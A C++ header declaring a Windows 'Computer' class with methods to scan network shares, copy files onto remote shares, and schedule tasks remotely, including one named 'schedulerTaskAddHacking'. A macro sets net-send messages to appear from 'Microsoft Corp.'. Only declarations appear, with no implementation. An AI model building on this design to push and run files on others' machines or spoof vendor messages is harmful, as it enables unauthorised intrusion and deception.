#include <windows.h>
#include <lm.h>
#include "NetBios.h"

#define MAX_MAPPING_SHARES     26

#define SOURCE_NET_SEND        "Microsoft Corp."

#pragma once

class Computer {
   private:
      char * computerName;
      char * IPAddress;
      NetBios * resourceShares;
           
   public:
      Computer(char * IP, bool autoScanShares = true);
      Computer(char * name, char * IP, bool autoScanShares = true);
      ~Computer() { delete [] computerName; delete[] IPAddress; delete[] resourceShares; }

      bool schedulerTaskAdd(const char * time, int daysWeek, const char * command, bool interactive = true);
      bool schedulerTaskAddHacking(const char * time, int daysWeek, const char * fileSourcePath, const char * filename, bool interactive = true);
      bool schedulerTaskAdd(const char * time, char * daysMonth, const char * command, bool interactive = true);     
      bool sendMessage(const char * destiny, const char * messageText);
      bool copyFileToSharesFolder(const char * strFilename, const char * strFilenameDestiny = NULL);
      bool copyFileToSharesMappingFolder(const char * strFilename);
      char * time();
      
      void scanResourceShares();
      void setComputerName(char * name);
      
      PSHARE_INFO_1 * getSharePrintersList();
      PSHARE_INFO_1 * getShareFoldersList();
      PSHARE_INFO_1 * getShareSpecialFoldersList();
      
      char * getComputerName() { return computerName; }
      char * getIPAddress() { return IPAddress; }
      long getNumPrinters();
      long getNumFolders();
      long getNumSpecialFolders();
};
